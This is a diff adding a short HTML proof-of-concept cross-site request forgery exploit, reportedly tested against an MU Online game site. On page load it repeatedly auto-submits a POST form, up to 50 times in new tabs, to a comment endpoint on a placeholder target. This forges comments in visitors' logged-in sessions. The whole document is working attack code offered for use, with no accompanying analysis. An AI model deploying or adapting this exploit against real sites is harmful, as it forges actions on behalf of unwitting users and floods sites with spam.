@@ -1,0 +1,25 @@
+<!-- Tested in MU Online -->
+<script type="text/javascript">
+var qtd = 0;
+var limit = 50; // Number of tabs opened in browser
+var seconds = 2; // Calling time of each flap
+	function submeter() {
+		if (qtd < limit) {
+			document.envia.submit();
+		}
+	qtd++;
+	}
+	function start_sending() {
+		seconds *= 10;
+		window.setInterval(function() {
+            submeter()
+        },seconds);  
+	}
+</script>
+<body onload="start_sending();">
+<form action="http://www.test.com/?pag=news&str=VIEW&id=ID-HERE&cmd=comment" name="envia" id="envia" method="POST" target="_blank">
+	<input type="text" name="Character" id="Character" value="www.twitter.com/JonathanSilvaTI">
+	<input type="text" name="Text" id="Text" value="CSRF POST DETECTED">
+	<input type="hidden" name="action" value="true">
+	<input type="submit" value="Send">
+</form>
